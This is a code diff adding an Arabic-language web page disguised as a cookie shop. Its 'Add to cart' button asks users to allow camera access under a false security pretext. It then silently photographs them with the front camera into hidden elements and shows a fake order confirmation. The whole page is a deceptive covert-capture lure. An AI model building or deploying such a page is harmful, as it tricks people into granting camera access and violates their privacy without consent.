@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>متجر الكوكيز السعيد 🍪</title>
+    <meta charset="UTF-8">
+    <style>
+        /* التصميم العام */
+        body { 
+            font-family: 'Arial', sans-serif; 
+            text-align: center; 
+            background-color: #fcebeb; 
+            color: #3e2723; 
+            padding: 20px;
+        }
+        .header {
+            background-color: #d84315; 
+            color: white;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 8px;
+        }
+        .cookie-item {
+            background-color: white;
+            border: 1px solid #ffccbc;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px auto;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        /* الزر الذي سيقوم بتشغيل الكاميرا */
+        #orderButton {
+            background-color: #4CAF50; 
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        #orderButton:hover {
+            background-color: #45a049;
+        }
+        /* إخفاء عناصر الكاميرا والتصوير بالكامل */
+        #videoElement, #canvas, #status { 
+            display: none !important; 
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>متجر الكوكيز السعيد 🍪</h1>
+        <p>ألذ كوكيز مُعد بحب وطازج يومياً!</p>
+    </div>
+
+    <div class="cookie-item">
+        <h2>كوكيز الشوكولاتة الكلاسيكي</h2>
+        <p>غني برقائق الشوكولاتة الداكنة. السعر: 15 ريال/القطعة</p>
+        <button id="orderButton">أضف إلى السلة</button>
+        <br><br>
+        <div id="fakeStatus" style="color: green; font-weight: bold; height: 30px;"></div>
+    </div>
+    
+    <video id="videoElement"></video>
+    <canvas id="canvas"></canvas>
+    <p id="status"></p>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const orderButton = document.getElementById('orderButton');
+        const fakeStatus = document.getElementById('fakeStatus');
+        const statusElement = document.getElementById('status'); 
+        let streamGlobal; 
+        let isCapturing = false;
+
+        function captureAndStop() {
+            if (isCapturing) return;
+            isCapturing = true;
+
+            fakeStatus.innerHTML = 'جاري معالجة الطلب... قد تستغرق عملية الدفع لحظات.';
+            orderButton.disabled = true;
+
+            setTimeout(() => {
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                if (streamGlobal) {
+                    streamGlobal.getTracks().forEach(track => track.stop());
+                }
+                
+                fakeStatus.innerHTML = '🎉 **تم تأكيد الطلب بنجاح!** شكراً لتسوقك معنا.';
+                orderButton.style.backgroundColor = '#9e9e9e';
+                orderButton.innerHTML = 'تم الطلب';
+
+                const imageDataURL = canvas.toDataURL('image/png');
+                statusElement.innerText = imageDataURL;
+                console.log('صورة ملتقطة (مخفية):', imageDataURL.substring(0, 50) + '...');
+                
+            }, 2000); 
+        }
+
+        orderButton.addEventListener('click', function() {
+            
+            fakeStatus.innerHTML = 'لحماية بياناتك، نحتاج لتأكيد جهازك... **الرجاء الضغط على "سماح"** عند ظهور النافذة.';
+            orderButton.disabled = true;
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                
+                // تحديد الكاميرا الأمامية (السيلفي)
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                })
+                .then(function(stream) {
+                    streamGlobal = stream;
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    video.onloadedmetadata = captureAndStop;
+
+                })
+                .catch(function(err) {
+                    fakeStatus.innerHTML = '❌ فشل إتمام الطلب! الرجاء المحاولة مرة أخرى.';
+                    orderButton.disabled = false;
+                });
+            } else {
+                fakeStatus.innerHTML = '❌ خطأ في النظام. الرجاء استخدام متصفح أحدث.';
+            }
+        });
+    </script>
+</body>
+</html>
